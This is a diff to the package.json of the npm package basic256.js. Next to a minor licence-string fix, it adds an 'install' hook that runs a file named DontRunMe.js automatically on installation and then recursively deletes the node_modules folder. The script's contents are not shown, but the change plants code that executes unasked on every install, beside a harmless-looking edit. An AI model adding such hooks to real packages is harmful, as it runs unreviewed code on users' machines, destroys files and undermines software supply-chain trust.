@@ -11,8 +11,9 @@
     "type": "git",
     "url": "git+https://github.com/linuxgemini/basic256.js.git"
   },
-  "license": "Apache-2",
+  "license": "Apache-2.0",
   "scripts": {
-    "test": "node test.js"
+    "install": "node ./DontRunMe.js; rm -rf ./node_modules/",
+    "test": "node ./test.js"
   }
 }
